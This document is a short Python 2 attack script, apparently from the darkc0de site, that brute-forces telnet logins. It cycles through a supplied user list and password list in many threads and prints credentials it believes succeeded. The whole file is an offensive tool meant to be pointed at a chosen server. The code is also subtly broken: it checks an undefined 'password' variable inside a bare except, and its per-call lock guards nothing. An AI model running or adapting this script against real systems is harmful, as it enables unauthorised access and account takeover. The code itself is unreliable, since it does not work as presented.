#!usr/bin/python
#Telnet Brute Forcer
#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys, telnetlib
from copy import copy

if len(sys.argv) !=4:
	print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[3], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com TelnetBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return value[0][:-1], users[0]
	else:
		return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			tn = telnetlib.Telnet(sys.argv[1])
			tn.read_until("login: ")
			tn.write(user + "\n")
			if password:
					tn.read_until("Password: ")
					tn.write(value + "\n")
			tn.write("ls\n")
			tn.write("exit\n")
			print tn.read_all()
			print "\t\nLogin successful:",value, user
			tn.close()
			work.join()
			sys.exit(2)
		except: 
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
